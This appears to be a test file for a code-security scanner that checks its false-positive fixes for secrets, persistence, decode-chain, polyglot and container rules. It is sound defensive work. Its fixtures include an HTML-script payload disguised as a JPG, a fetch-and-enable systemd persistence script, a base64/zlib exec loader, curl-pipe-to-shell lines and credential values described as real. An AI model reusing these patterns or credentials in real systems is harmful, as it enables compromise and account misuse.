            ("src/NzbDrone.Core.Test/Files/html_image.jpg", True),
            ("okio-testing-support/src/resources/spanning.zip", True),
            ("integration_tests/fixtures/key.pem", True),
            ("docs/latest/guide.md", False),
            ("src/latest/config.py", False),
            ("contest/entry.py", False),
            ("src/main.py", False),
        ],
    )
    def test_which_directories_hold_test_material(self, path: str, expected: bool) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path) is expected


class TestAWebpNamedPng:
    """A build step or a designer converts an asset and keeps the old name, and WebP is
    the format that happens to most: `odysseus`'s `static/icons/sglang-logo.png` and
    `miru-app`'s `assets/icon/anilist.jpg` are both WebP. Neither was recognised at all,
    so the mismatch check could not say they were images saved under the wrong name --
    only that they were not PNG.
    """

    WEBP = b"RIFF$\xaa\x01\x00WEBPVP8X\n\x00\x00\x00" + b"\x00" * 64

    def test_a_webp_under_an_image_name_is_a_naming_error(self, tmp_path) -> None:
        icons = tmp_path / "static" / "icons"
        icons.mkdir(parents=True)
        (icons / "logo.png").write_bytes(self.WEBP)
        (icons / "avatar.jpg").write_bytes(self.WEBP)
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
        ]

    def test_html_under_an_image_name_still_is(self, tmp_path) -> None:
        """The control, and the reason only the image KINDS are interchangeable: a
        document served as a picture is how a file-upload filter gets past."""
        (tmp_path / "payload.jpg").write_bytes(
            b"<html><body><h1>Direct</h1><script>fetch('/x')</script></body></html>\n"
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SUSPECT.POLYGLOT.MISMATCH.001"
        ]


class TestAnUninstallerIsTheOppositeOfPersistence:
    """`pi-hole`'s `automated install/uninstall.sh` runs
    `rm -f /etc/systemd/system/pihole-FTL.service`, and that file was the blocking
    finding in the repository -- while the real installer beside it was correctly
    excused as machine provisioning. The persist pattern listed the unit directory as a
    bare path, and an uninstaller names exactly the same paths as an installer.

    Written as a list of WRITE verbs rather than a list of removal verbs, because the
    ways to not-write a path are unbounded -- `rm`, `unlink`, `[ -d`, `test -f`,
    `find -delete` -- and the ways to write one are four.
    """

    def _persist(self, tmp_path):
        return [f for f in Scanner().scan(tmp_path).findings if "PERSIST" in f.rule_id]

    def test_removing_a_unit_file_is_not_installing_one(self, tmp_path) -> None:
        (tmp_path / "uninstall.sh").write_text(
            "#!/bin/bash\n"
            "disable_service pihole-FTL\n"
            "rm -f /etc/systemd/system/pihole-FTL.service &> /dev/null\n"
            "if [[ -d '/etc/systemd/system/pihole-FTL.service.d' ]]; then\n"
            "  rm -rf /etc/systemd/system/pihole-FTL.service.d\n"
            "fi\n"
            "curl -sSL https://install.example.test/uninstall > /dev/null\n"
        )
        assert self._persist(tmp_path) == []

    def test_writing_one_still_is(self, tmp_path) -> None:
        """The control. A unit file written and enabled is persistence whoever does it;
        the provisioning ceiling is what keeps an honest installer off the gate."""
        (tmp_path / "install.sh").write_text(
            # The fetch is part of the fixture, not decoration: `SUSPECT.PERSIST.001`
            # asks for a foothold AND something to put in it.
            "#!/bin/bash\n"
            "curl -sSL https://install.example.test/agent -o /usr/local/bin/agent\n"
            "cp agent.service /etc/systemd/system/agent.service\n"
            "systemctl enable agent.service\n"
        )
        assert self._persist(tmp_path)


class TestTwoSpellingsOfOneDecodeAreNotAStack:
    """`SUSPECT.DECODE_CHAIN.001` says the layers come "before executing the result",
    and asked whether a file contains two decodes and an execution within two hundred
    lines. `tw93/Mole`'s uninstaller base64-decodes a FILE LIST so that names with
    spaces survive, and writes the decode twice -- `base64 -D` for macOS and
    `base64 -d` for GNU -- forty-eight lines from a `$(...)` on line 6. Reported
    MALICIOUS at CRITICAL, in an uninstaller.

    A portability fallback is one layer written twice. The corpus sample for this rule
    has its two decodes and its `exec` on three consecutive lines.
    """

    def test_a_portability_fallback_is_not_two_layers(self, tmp_path) -> None:
        lib = tmp_path / "lib" / "uninstall"
        lib.mkdir(parents=True)
        (lib / "batch.sh").write_text(
            "#!/bin/bash\n"
            'SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"\n'
            + "".join(f"# filler line {n}\n" for n in range(40))
            + "decode_file_list() {\n"
            "    local decoded\n"
            "    if ! decoded=$(printf '%s' \"$encoded\" | base64 -D 2> /dev/null); then\n"
            "        if ! decoded=$(printf '%s' \"$encoded\" | base64 -d 2> /dev/null); then\n"
            '            log_error "Failed to decode file list" >&2\n'
            "        fi\n"
            "    fi\n"
            "}\n"
        )
        assert not [f for f in Scanner().scan(tmp_path).findings if "DECODE_CHAIN" in f.rule_id]

    def test_two_encodings_and_an_exec_together_still_are(self, tmp_path) -> None:
        """The control, and the shape the rule is named for."""
        (tmp_path / "loader.py").write_text(
            "import base64\nimport zlib\n\n"
            'BLOB = "eNorTi0sTS1SSM7PLShKLS5OTVFIzs8tKEotLk5NUQAAoTMK1g=="\n\n'
            "stage_one = base64.b64decode(BLOB)\n"
            "stage_two = zlib.decompress(stage_one)\n"
            "exec(stage_two.decode())\n"
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if "DECODE_CHAIN" in f.rule_id and f.severity >= Severity.HIGH
        ]


class TestAFileOfKeysIsATable:
    """The directory form of this collapse needs five keys, because a directory is a
    place a leak can land in: a stray `id_rsa`, a `server.key` beside a `deploy.sh`. A
    FILE is not. A leak is one key in a file -- it got there by being copied in.

    `bitwarden/server` keeps four in `util/RustSdk/rust/src/rsa_keys.rs`, test key
    material for its SDK bindings held as Rust constants, and mbedtls's `certs.c` holds
    a dozen. Four CRITICAL findings pointing at four lines of one file is not how to tell
    a reader that.
    """

    @staticmethod
    def _key(seed: str) -> str:
        # The leading base64 has to differ per key: the private-key pattern captures the
        # armour plus twelve characters, and `MIIEogIBAAKC` is the DER header every
        # 2048-bit RSA key shares -- so four keys differing later in the modulus produce
        # four identical matches and one finding, which is not what this tests.
        head = seed * 4 + "IEogIBAAKCAQEA"
        return (
            "-----BEGIN RSA PRIVATE KEY-----\n"
            + "\n".join([head + "7Qz92LmNb4Rv1Ksd3TfAq2EgHj0Cg5AqB7xQ2mVt9Xb1Np"] * 18)
            + "\n-----END RSA PRIVATE KEY-----\n"
        )

    def test_four_keys_in_one_file_are_one_finding(self, tmp_path) -> None:
        util = tmp_path / "util"
        util.mkdir()
        (util / "rsa_keys.rs").write_text(
            "".join(
                f'pub const KEY_{size}: &str = "{self._key(seed)}";\n'
                for size, seed in ((2048, "a"), (3072, "b"), (4096, "c"), (8192, "d"))
            )
        )
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert len(keys) == 1
        assert "holds 4 private keys" in keys[0].message
        assert keys[0].severity <= Severity.MEDIUM
        assert ("keys_in_file", "4") in keys[0].evidence.metadata

    def test_one_key_in_a_file_is_what_a_leak_looks_like(self, tmp_path) -> None:
        """The control, and the whole reason the threshold exists."""
        (tmp_path / "deploy_key").write_text(self._key("e"))
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.PRIVATE_KEY.001" and f.severity >= Severity.HIGH
        ]

    def test_two_keys_in_a_file_are_still_two(self, tmp_path) -> None:
        """The threshold asserted from below. A keypair committed together is two places
        somebody has to look."""
        (tmp_path / "keys.go").write_text(
            f"const a = `{self._key('f')}`\nconst b = `{self._key('g')}`\n"
        )
        keys = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert len(keys) == 2


class TestTheAlphabetAndTheDigitsAreTwoRuns:
    """`looks_sequential` compared the LONGEST run against the share, and the alphabet
    plus the digits is two runs, because `9` and `a` are not adjacent codepoints.

    This project's own CI sets
    `SECRET_KEY: "ci-deploy-check-key-0123456789abcdefghijklmnopqrstuvwxyz-throwaway"`,
    which is as plainly not a credential as a value gets. It scored 26 against a
    threshold of 26.4 and was reported at HIGH -- the tool failing its own repository by
    four tenths of a character.
    """

    CI_KEY = b"ci-deploy-check-key-0123456789abcdefghijklmnopqrstuvwxyz-throwaway"

    def test_two_runs_add_up(self) -> None:
        from cordon_scanner.detect.secrets import looks_sequential

        assert looks_sequential(self.CI_KEY)

    @pytest.mark.parametrize(
        "value",
        [
            b"glpat-AAAAAAAAAAAAAAAA",
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"hunter2Sup3rSecretV",
            b"SW2YcwTIb9zpOOhoPsMm",
            b"xKc9vB2mQ7wRtY4u",
            b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
        ],
    )
    def test_summing_runs_launders_nothing(self, value: bytes) -> None:
        """What makes the change safe is what it asks of real key material: a generated
        credential has no run of six consecutive codepoints at all, so its total is zero
        however many runs are added up. Across every value this suite keeps as a guard
        the longest run is two."""
        from cordon_scanner.detect.secrets import looks_sequential

        assert not looks_sequential(value)

    def test_a_name_that_says_demo(self, tmp_path) -> None:
        """`demo` joins the not-real vocabulary and `test` still does not. A
        `TEST_API_KEY` in CI is very often a real key for a test account; demo data is
        data nobody authenticates to, and `**/demo/**` has been a test-material path
        since the beginning."""
        from cordon_scanner.detect.secrets import names_placeholder

        assert names_placeholder("DEMO_PASSWORD")
        assert not names_placeholder("TEST_API_KEY")
        (tmp_path / "_demo_workspace.py").write_text('DEMO_PASSWORD = "Praxis@2026!"\n')
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_plain_password_in_a_script_is_still_reported(self, tmp_path) -> None:
        """The control, and it is this project's own remaining finding: a committed
        password in a development script is a committed password, and the fix belongs in
        that repository rather than in this rule."""
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "isolation_matrix.py").write_text('PASSWORD = "Praxis@2026!"\n')
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]


class TestProseInsideABlockComment:
    """The per-line comment test asks whether a continuation line begins with `*`, which
    is what a documentation comment looks like in every C-family codebase -- and is not
    what a paragraph of prose looks like.

    Praxis's `AuthForcePasswordReset.tsx` explains why its form carries `method="post"`
    by quoting the URL that leaked when hydration failed on a dev build, indented inside
    a `/* ... */`. Reported as a credential assignment at HIGH, three times across three
    auth templates -- in the comment that exists to explain why the leak was fixed.

    A pass over the file, cached per path, which is what the docstring and Rust
    test-module span helpers beside it already do.
    """

    COMMENT = (
        "export function Form() {\n"
        "  return (\n"
        "    <form\n"
        '      method="post"\n'
        "      /* Defence for the one case React cannot handle: a handler that never\n"
        "           attached. If hydration fails the browser falls back to the form's\n"
        "           NATIVE submission, and a form with no method GETs:\n"
        "\n"
        "               /sign-in?email=admin%40example.test&password=Praxis%402026%21\n"
        "\n"
        "           The password in the address bar, in history, and in every access\n"
        "           log between here and the origin.\n"
        "       */\n"
        "    />\n"
        "  );\n"
        "}\n"
    )

    def test_a_credential_quoted_in_prose_is_not_a_credential(self, tmp_path) -> None:
        (tmp_path / "AuthForm.tsx").write_text(self.COMMENT)
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_capability_quoted_in_prose_is_not_a_capability(self, tmp_path) -> None:
        """The same fix on the other detector. A comment does not run, whichever of the
        two ways it is written."""
        (tmp_path / "installer.ts").write_text(
            "export function setup() {\n"
            "  /* Why this is not a pipe any more.\n"
            "       The old bootstrap ran\n"
            "\n"
            "           curl -fsSL https://get.example.test/install.sh | sh\n"
            "\n"
            "       which meant the image held whatever that host served that minute.\n"
            "   */\n"
            "  return runPinned();\n"
            "}\n"
        )
        assert Scanner().scan(tmp_path).findings == ()

    def test_the_same_line_outside_the_block_still_fires(self, tmp_path) -> None:
        """The control. Closing the comment before the line puts it back in the code."""
        (tmp_path / "AuthForm.tsx").write_text(
            self.COMMENT.replace(
                "      /* Defence for the one case React cannot handle: a handler that never\n",
                "      /* Defence. */\n",
            )
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_block_opener_inside_a_string_opens_nothing(self, tmp_path) -> None:
        """What keeps the span pass honest: `"/*"` is two characters of data."""
        (tmp_path / "lexer.ts").write_text(
            'const BLOCK_OPEN = "/*";\nexport const token = "Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5";\n'
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]


class TestATranslationIsNotACredentialInAnyScript:
    """Keycloak was the third-worst repository in the corpus at 66 blocking findings, and
    forty-odd of them were `messages_<locale>.properties` -- the Swedish, Portuguese and
    Catalan words for "password", assigned to a key called `password`. `dbeaver` had
    twelve of the same thing and `localsend` ships Inno Setup language files named after
    the language.

    Two fixes, because either alone leaves half of it. Every credential format is ASCII
    by specification -- base64, base64url, base62, base32, hex -- so a byte above 0x7f
    means human language whatever the file is called. And a format that exists only to
    hold translations says so in its extension.
    """

    def _hits(self, tmp_path):
        return [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_a_non_ascii_value_is_human_language(self, tmp_path) -> None:
        (tmp_path / "strings.properties").write_text(
            "passwordConfirm=Bekräftelse\npasswordNew=Nytt lösenord\n",
            encoding="utf-8",
        )
        assert self._hits(tmp_path) == []

    def test_a_language_file_is_a_translation(self, tmp_path) -> None:
        """Latin-script translations need the path as well: the Portuguese for "password"
        is ASCII from end to end."""
        inno = tmp_path / "support" / "build" / "windows" / "inno"
        inno.mkdir(parents=True)
        (inno / "Portuguese.isl").write_text(
            "WizardPassword=Palavra-passe\nPasswordLabel=Palavra-passe\n", encoding="utf-8"
        )
        hits = self._hits(tmp_path)
        assert all(f.severity <= Severity.MEDIUM for f in hits)

    @pytest.mark.parametrize(
        "value",
        [
            b"glpat-AAAAAAAAAAAAAAAA",
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"hunter2Sup3rSecretV",
            b"SW2YcwTIb9zpOOhoPsMm",
            b"xKc9vB2mQ7wRtY4u",
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
        ],
    )
    def test_the_non_ascii_rule_launders_nothing(self, value: bytes) -> None:
        """The guard. The rule rests on a fact about the formats rather than on a
        judgement: none of these alphabets contains a byte above 0x7f, so no value in
        any of them can reach the new alternative."""
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None

    def test_an_ascii_credential_in_a_properties_file_still_fires(self, tmp_path) -> None:
        """The control, and the reason the non-ASCII rule is about the VALUE rather than
        about `.properties` files: a Spring `application.properties` holds real ones."""
        # Undotted, because a dotted key is a separate gap this change did not touch:
        # the assignment pattern will not start a name after a `.`, so
        # `spring.datasource.password=` has never matched and still does not.
        (tmp_path / "application.properties").write_text(
            "datasource_password=Xk9mQ2vB7wRtY4uZp1Ls\n"
        )
        assert self._hits(tmp_path)


class TestAUuidIsWeakerEvidenceThanAToken:
    """Three of six sampled assignment findings were a UUID: `vimagick/dockerfiles` sets
    `SESSION_SECRET` to one, PhotoPrism sets `PHOTOPRISM_OIDC_SECRET` to one, and
    `JamesWoolfenden/pike` has a third in a Terraform fixture.

    Graded down rather than dismissed, and both halves are deliberate. A UUID genuinely
    is the secret in those first two systems, so the shape cannot be excused. It is also
    the commonest identifier format in computing and the one an example value gets
    generated in -- 122 bits in a format whose purpose is identification is weaker
    evidence than forty characters of base62, whose only purpose is to be a key.
    """

    def test_a_uuid_does_not_block_and_a_token_does(self, tmp_path) -> None:
        (tmp_path / "compose.yaml").write_text(
            "services:\n  app:\n    environment:\n"
            "      - SESSION_SECRET=141a0668-fd9b-4f4e-b5d0-1b0aa8202c5b\n"
            "      - API_TOKEN=Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj0Cg5\n"
        )
        by_name = {
            f.explanation.summary: f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        }
        assert len(by_name) == 2, by_name
        uuid = next(f for k, f in by_name.items() if "SESSION_SECRET" in k)
        token = next(f for k, f in by_name.items() if "API_TOKEN" in k)
        assert uuid.severity <= Severity.MEDIUM
        assert token.severity >= Severity.HIGH


class TestABundleWithoutABundleName:
    """`alibaba/nacos` serves `console/src/main/resources/static/legacy/js/main.js`: a
    bundle on one line of three hundred kilobytes. The capability detector has ceilinged
    on line length since it measured the same thing; the secrets detector was comparing
    names only, and `**/*.min.js` cannot see a minified file that was not given a
    minified file's name.
    """

    LONG = (
        '!function(){"use strict";var i={}.hasOwnProperty;'
        + ";".join(f"var v{n}=1" for n in range(200))
        + ';var TOKEN="Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj";\n'
    )

    def test_a_minified_file_is_build_output(self, tmp_path) -> None:
        static = tmp_path / "static" / "js"
        static.mkdir(parents=True)
        (static / "main.js").write_text(self.LONG)
        hits = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]
        assert hits, "still reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)

    def test_the_same_assignment_on_its_own_line_still_blocks(self, tmp_path) -> None:
        (tmp_path / "app.js").write_text('const TOKEN = "Xk9mQ2vB7wRtY4uZp1LsDy3Fz6Hj";\n')
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001" and f.severity >= Severity.HIGH
        ]


class TestARouteIsNotAKey:
    """`Stirling-Tools/Stirling-PDF` declares its API surface as constants --
    `REMOVE_PASSWORD = "/api/v1/security/remove-password"` -- and `v1` was the only
    reason that did not read as a path: the path alternative admits no digits.

    It admits none deliberately. `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` is an AWS
    secret access key with two slashes in it, and allowing digits in an unrooted path
    would excuse every one of them. A leading `/` or `./` is what separates the two: a
    key is not written with a leading slash, and a route is written with nothing else.
    """

    @pytest.mark.parametrize(
        ("value", "dismissed"),
        [
            (b"/api/v1/security/remove-password", True),
            (b"/v1/tokens", True),
            (b"./scripts/build.sh", True),
            (b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMAAAKEY", False),
            (b"GC7UDZ3Ra4jLcmfQSagKCDJ1JEy-mU6pBBhFrS3tDEHILrK7j3TQHUrglkO5SgZ_", False),
        ],
    )
    def test_which_slashed_values_are_paths(self, value: bytes, dismissed: bool) -> None:
        assert (NOT_A_SECRET.match(value) is not None) is dismissed

    def test_a_route_table_scans_clean(self, tmp_path) -> None:
        (tmp_path / "tool_models.py").write_text(
            "class Endpoint:\n"
            '    REMOVE_PASSWORD = "/api/v1/security/remove-password"\n'
            '    ADD_PASSWORD = "/api/v1/security/add-password"\n'
        )
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_an_aws_key_in_the_same_shape_still_fires(self, tmp_path) -> None:
        """The control. `rclone` commits an obfuscated OAuth client secret with a
        trailing underscore and no leading slash, and it stays a finding."""
        (tmp_path / "backend.go").write_text(
            "const clientSecret = "
            '"GC7UDZ3Ra4jLcmfQSagKCDJ1JEy-mU6pBBhFrS3tDEHILrK7j3TQHUrglkO5SgZ_"\n'
        )
        assert [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]


class TestSeventyRepositoriesOneEach:
    """A sample of one assignment finding from each of seventy different repositories,
    so the shapes are spread rather than dominated by whichever repository had the most.
    Five classes came out of it, and thirteen of the seventy were real credentials that
    every one of these fixes has to leave alone.
    """

    @pytest.mark.parametrize(
        "value",
        [
            # A stored password hash. Two of the seventy: a bcrypt hash assigned to
            # `$password` in one PHP seed file and to `$passwordHash` in another.
            b"$2a$12$uKw0MYV.LEA64Y6Cux1UIO2YpJ00P6TqUta4YYhNdnnqElRXrZIiC",
            b"$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC",
            b"$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$abcdef",
            b"pbkdf2_sha256$600000$saltsaltsalt$aGFzaGhhc2g=",
            b"{SSHA}cRYzQgK4i8FqR7mB1nS9jH2fXaU=",
            # A slug: three segments or more, sixteen characters or fewer each, no
            # capital anywhere. A Tailwind class, a feature flag, a config key.
            b"border-violet-500/30",
            b"worldmonitor-free-map-panel-access-v1",
            b"pm-27278-v2-password-registration",
            b"gh-app_installation_id",
            # An expression marker the set did not have. An Android layout writes a
            # theme-attribute reference with `?`; Meson writes a preprocessor token
            # with `#`; Kotlin force-unwraps twice.
            b"?colorControlNormal",
            b"#mesondefine",
            b"webPoTokenGenerator!!",
            # A shell substitution in backticks, and a `$` inside a member chain: a
            # TextMate grammar builds a scope name out of a capture group.
            b"`gen_jwt_secret`",
            b"keyword.tag-$0",
        ],
    )
    def test_these_are_not_credentials(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER, is_password_hash

        assert (
            NOT_A_SECRET.match(value) is not None
            or PLACEHOLDER.search(value) is not None
            or is_password_hash(value)
        )

    @pytest.mark.parametrize(
        "value",
        [
            b"glpat-AAAAAAAAAAAAAAAA",
            b"dbw2OtmVEeuUvIptb1Coyg",
            b"hunter2Sup3rSecretV",
            b"SW2YcwTIb9zpOOhoPsMm",
            b"xKc9vB2mQ7wRtY4u",
            b"phc_Kq3Wd7Rt9Zx2Vb5Nm8Jf4Hs6Lp1Gy0Cu3Ae7Tn2Qi9Z",
            b"npm_aBcDeFgHiJkLmNoPqRsTuVwXyZ012345",
            b"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMAAAKEY",
            # The thirteen real ones from the same sample, which is what makes the list
            # above a set of fixes rather than a set of holes. Each was committed to a
            # public repository by somebody who meant to.
            b"hc2wb63opyfxnwn",
            b"yku5ej8nvfaor28lvtrabcx0wkrpkztz",
            b"sec-01e0d4agf6pfvwdjwxp61n3fvg",
            b"4byOdcHPvnUGJ5DL2cwLZccI5HUKKxkVJ",
            b"lsACyCD94FhDUtGTXi3QzcFE2uU1hqtDaKeqrdwj",
            b"wLc4dpQvRt8mK1nS9jH2fXaU7yEoB3iZ6vNqTgCkW5A",
            b"GC7UDZ3Ra4jLcmfQSagKCDJ1JEy-mU6pBBhFrS3tDEHILrK7j3TQHUrglkO5SgZ_",
        ],
    )
    def test_and_these_still_are(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER, is_password_hash, looks_sequential

        assert NOT_A_SECRET.match(value) is None
        assert PLACEHOLDER.search(value) is None
        assert not is_password_hash(value)
        assert not looks_sequential(value)

    def test_a_value_that_is_its_own_name(self, tmp_path) -> None:
        """Four of the seventy. An enum member, a storage key, a feature flag, a
        telemetry event: the name, spelled the way the wire spells it."""
        (tmp_path / "keys.kt").write_text(
            'private const val V2_UPGRADE_TOKEN = "v2UpgradeToken"\n'
            'private const val SERVER_PASSWORD1 = "serverPassword1"\n'
        )
        (tmp_path / "events.ts").write_text(
            "  TOKEN_STORAGE_INITIALIZATION = 'token_storage_initialization',\n"
        )
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]

    def test_the_comparison_is_equality_and_not_containment(self) -> None:
        """The control. A real credential often carries its own name in front of it, so
        a prefix or containment test here would excuse the thing the rule is for.

        Asserted on the function rather than through a scan, because the separated-
        identifier branch of `NOT_A_SECRET` independently dismisses
        `api_key_<token>` -- a pre-existing behaviour this change did not touch, and one
        that would have made a scan-level control pass for the wrong reason."""
        from cordon_scanner.detect.secrets import value_is_the_name

        assert value_is_the_name("API_KEY", "api_key")
        assert value_is_the_name("API_KEY", "apiKey")
        assert not value_is_the_name("API_KEY", "api_key_aB3kQ9mZ2xT7vL4nR8wY")
        assert not value_is_the_name("API_KEY", "aB3kQ9mZ2xT7vL4nR8wY")
        assert not value_is_the_name("API_KEY", "")

    def test_a_bcrypt_hash_in_a_seed_file(self, tmp_path) -> None:
        (tmp_path / "seed.php").write_text(
            "<?php\n$password = '$2a$12$uKw0MYV.LEA64Y6Cux1UIO2YpJ00P6TqUta4YYhNdnnqElRXrZIiC';\n"
        )
        assert not [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        ]


class TestTheSeverityARuleDeclares:
    """`POLICY.LOCKFILE.INTEGRITY.001` declares `severity: medium` in its catalogue entry
    -- which is what `cordon-scanner rules list`, the coverage matrix and the
    documentation all show -- and the detector reported `high` for the partial case. The
    one severity a reader could check was not the one that decided whether their build
    failed, and 74 of the 1,427 corpus repositories were blocked by the divergence.

    The claim belongs at medium beside the rest of its category:
    `POLICY.CI.UNPINNED_ACTION.001` is medium, `POLICY.CONTAINER.UNPINNED_BASE.001` is
    low, `POLICY.DEPENDENCY.INTEGRITY.001` is medium. And the `>90%` branch of this same
    rule has always reported at medium, so the partial case being the harsher of the two
    was backwards as well.
    """

    @staticmethod
    def _lock(tmp_path, hashed: int, bare: int) -> None:
        import json

        packages = {"": {"name": "p", "version": "1.0.0"}}
        for n in range(hashed):
            packages[f"node_modules/pkg{n}"] = {
                "version": "1.0.0",
                "resolved": f"https://registry.npmjs.org/pkg{n}/-/pkg{n}-1.0.0.tgz",
                "integrity": "sha512-" + "A" * 86 + "==",
                "dev": True,
            }
        for n in range(bare):
            packages[f"node_modules/bare{n}"] = {"version": "1.0.0", "dev": True}
        (tmp_path / "package-lock.json").write_text(
            json.dumps({"name": "p", "lockfileVersion": 3, "packages": packages})
        )
        (tmp_path / "package.json").write_text('{"name": "p", "version": "1.0.0"}')

    def test_the_declared_severity_is_what_is_reported(self, tmp_path) -> None:
        self._lock(tmp_path, hashed=10, bare=3)
        hits = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "POLICY.LOCKFILE.INTEGRITY.001"
        ]
        assert len(hits) == 1
        assert hits[0].severity <= Severity.MEDIUM

    def test_the_message_says_which_shape_it_found(self, tmp_path) -> None:
        """An entry with a `resolved` and no `integrity` is pinned to a tarball and
        unverified. An entry with neither is not pinned at all, which is what the corpus
        actually holds, and the old message asserted the wrong half."""
        self._lock(tmp_path, hashed=10, bare=3)
        hits = [
            f
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "POLICY.LOCKFILE.INTEGRITY.001"
        ]
        assert "no resolved URL either" in hits[0].message
        assert "regenerating the lockfile fixes it" in hits[0].message

    def test_the_declaration_and_the_finding_agree(self) -> None:
        """The guard for the class of defect rather than for this instance: every rule
        the lockfile detector declares has to report at the severity it declares, or
        `rules list` is misinformation."""
        from cordon_scanner.detect.lockfile import LockfileDetector

        declared = {r.id: r.severity for r in LockfileDetector.declared_rules()}
        assert declared["POLICY.LOCKFILE.INTEGRITY.001"] <= Severity.MEDIUM


class TestAPinCountsForItsOwnCommand:
    """The mitigation window was 600 bytes either side of the match, which in a compact
    Dockerfile spans several unrelated `RUN` instructions -- so a Dockerfile that pins one
    download and pipes another straight into a shell credited the second for the first's
    pin. The existing test for this property asserted the right thing about WHICH
    occurrence is reported and nothing about what counts as its mitigation, which is how
    the hole survived being thought about once.

    A shell command is a logical line: one physical line plus every line a trailing
    backslash continues onto, because the `curl` and the `sha256sum -c` that checks it
    are two clauses of one `&&` chain. A workflow `run:` block is one script, so a pin at
    its top legitimately covers a fetch at its bottom, and the block's own region is the
    window there.
    """

    def _fetch(self, path, rule):
        return [f for f in Scanner().scan(path).findings if f.rule_id == rule]

    def test_a_pin_on_another_instruction_does_not_count(self, tmp_path) -> None:
        (tmp_path / "Dockerfile").write_text(
            "FROM debian:12\n"
            "ARG NODE_MAJOR=22\n"
            'RUN curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -\n'
            "RUN curl -fsSL https://sh.rustup.rs | sh -s -- -y\n"
        )
        hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
        assert [f for f in hits if f.severity >= Severity.HIGH]

    def test_a_pin_on_its_own_instruction_does(self, tmp_path) -> None:
        (tmp_path / "Dockerfile").write_text(
            "FROM debian:12\n"
            "ARG NODE_MAJOR=22\n"
            'RUN curl -fsSL "https://deb.nodesource.com/setup_${NODE_MAJOR}.x" | bash -\n'
        )
        hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
        assert hits and all(f.severity <= Severity.MEDIUM for f in hits)

    def test_a_checksum_across_continuations_counts(self, tmp_path) -> None:
        """What the generous window was for, and what a logical line keeps: a verified
        fetch is written across several clauses joined by `&&` and a backslash."""
        (tmp_path / "Dockerfile").write_text(
            "FROM debian:12\n"
            "ENV SUM=9b2c1ddee1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7081920a3b4c\n"
            "RUN curl -fsSL -o /tmp/tool.tgz https://example.test/tool.tgz \\\n"
            ' && echo "${SUM}  /tmp/tool.tgz" | sha256sum -c - \\\n'
            " && tar -xzf /tmp/tool.tgz -C /usr/local \\\n"
            " && chmod +x /usr/local/bin/tool\n"
        )
        hits = self._fetch(tmp_path, "SUSPECT.CONTAINER.FETCH_EXEC.001")
        assert all(f.severity <= Severity.MEDIUM for f in hits)

